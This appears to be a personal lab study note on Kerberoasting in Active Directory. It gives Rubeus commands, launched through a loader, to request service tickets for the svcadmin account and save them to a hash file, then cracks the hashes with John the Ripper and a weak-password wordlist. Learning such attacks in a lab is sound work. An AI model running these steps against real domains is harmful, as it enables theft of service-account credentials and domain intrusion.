![Pasted image 20250621173432](Pasted%20image%2020250621173432.png)

if an user who is also an service accoount and its spn is set an not null then attck that account to easily brute force it

![Pasted image 20250621174028](Pasted%20image%2020250621174028.png)


![Pasted image 20250621174055](Pasted%20image%2020250621174055.png)


![Pasted image 20250621174121](Pasted%20image%2020250621174121.png)

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /stats

```

![Pasted image 20250621174234](Pasted%20image%2020250621174234.png)

```
Get-DomainUser -SPN
```

![Pasted image 20250621174857](Pasted%20image%2020250621174857.png)

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user: svcadmin/simple
```

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec
```

```
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin/simple/rc4opsec /outfile: C:\AD\Tools\hashes.txt
```




Now we have hashes.txt and we are going to brute force it 

first we have to remove :1433 form the hash

![Pasted image 20250621175709](Pasted%20image%2020250621175709.png)

```
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

![Pasted image 20250621175811](Pasted%20image%2020250621175811.png)

![Pasted image 20250621175852](Pasted%20image%2020250621175852.png)

